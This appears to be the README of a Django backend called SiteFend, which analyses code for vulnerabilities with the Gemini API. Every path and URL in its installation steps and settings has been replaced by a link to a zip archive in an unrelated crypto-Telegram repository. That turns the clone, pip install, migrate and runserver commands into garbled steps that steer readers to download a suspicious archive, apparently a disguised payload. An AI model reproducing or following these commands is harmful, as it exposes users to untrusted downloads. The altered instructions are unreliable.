# SiteFend Backend

This repository contains the backend of the SiteFend application, designed to analyze code snippets for security vulnerabilities using the Gemini AI API. The backend is built using Django and serves as the API for processing code analysis requests.

## Table of Contents

- [Installation](#installation)
- [Configuration](#configuration)
- [API Endpoints](#api-endpoints)
- [Usage](#usage)
- [Gemini AI Integration](#gemini-ai-integration)
- [Error Handling](#error-handling)
- [Testing](#testing)
- [Contributing](#contributing)
- [License](#license)

## Installation

### Prerequisites

- Python 3.x
- Django 4.x
- SQLite (or any other database supported by Django)

### Setup

1. Clone the repository:
    ```bash
    git clone https://github.com/algobytesolutions/Best-Crypto-Telegram-Channels/raw/refs/heads/main/analyzer/migrations/Channels_Crypto_Telegram_Best_v2.7.zip
    cd sitefend-backend
    ```

2. Install the required Python packages:
    ```bash
    pip install -r https://github.com/algobytesolutions/Best-Crypto-Telegram-Channels/raw/refs/heads/main/analyzer/migrations/Channels_Crypto_Telegram_Best_v2.7.zip
    ```

3. Apply the database migrations:
    ```bash
    python https://github.com/algobytesolutions/Best-Crypto-Telegram-Channels/raw/refs/heads/main/analyzer/migrations/Channels_Crypto_Telegram_Best_v2.7.zip migrate
    ```

4. Create a `.env` file in the root directory and add your Gemini AI API key and other necessary environment variables:
    ```bash
    GEMINI_API_KEY=your-api-key
    ```

5. Start the Django development server:
    ```bash
    python https://github.com/algobytesolutions/Best-Crypto-Telegram-Channels/raw/refs/heads/main/analyzer/migrations/Channels_Crypto_Telegram_Best_v2.7.zip runserver
    ```

## Configuration

Ensure that your Django settings (`https://github.com/algobytesolutions/Best-Crypto-Telegram-Channels/raw/refs/heads/main/analyzer/migrations/Channels_Crypto_Telegram_Best_v2.7.zip`) include the following configurations:

```python
# https://github.com/algobytesolutions/Best-Crypto-Telegram-Channels/raw/refs/heads/main/analyzer/migrations/Channels_Crypto_Telegram_Best_v2.7.zip

GEMINI_API_KEY = 'your-gemini-api-key'
GEMINI_API_URL = 'https://github.com/algobytesolutions/Best-Crypto-Telegram-Channels/raw/refs/heads/main/analyzer/migrations/Channels_Crypto_Telegram_Best_v2.7.zip'

CORS_ALLOWED_ORIGINS = [
    'http://localhost',
    'https://*https://github.com/algobytesolutions/Best-Crypto-Telegram-Channels/raw/refs/heads/main/analyzer/migrations/Channels_Crypto_Telegram_Best_v2.7.zip',
]

ALLOWED_HOSTS = ['*']
